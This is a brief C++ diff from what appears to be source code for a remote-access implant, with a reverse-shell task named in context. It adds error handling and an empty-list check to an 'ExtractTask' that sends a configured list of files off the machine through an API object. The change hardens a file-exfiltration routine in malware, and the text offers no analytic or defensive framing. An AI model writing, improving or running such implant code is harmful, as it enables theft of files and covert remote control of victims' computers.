@@ -2,6 +2,7 @@
 #include "config.hpp"
 #include <memory>
 #include <thread>
+#include <exception>
 
 
 /* Refactor to hashmap */
@@ -58,7 +59,15 @@ void ReverseShellTask::worker() {
 void ExtractTask::run() {
     Api api = Api::get_instance();
 
-    for (auto& file_path: file_to_extract) {
-        api.send_file(file_path);
+    try {
+        if (file_to_extract.empty()) return;
+
+        for (auto& file_path: file_to_extract) {
+            api.send_file(file_path);
+        }
+    } catch (std::exception& e) {
+        std::cout << "Standard exception: " << e.what() << std::endl;
+        std::cout << "[ERROR] Invalid configuration in files_to_extract" << std::endl;
     }
+    
 }
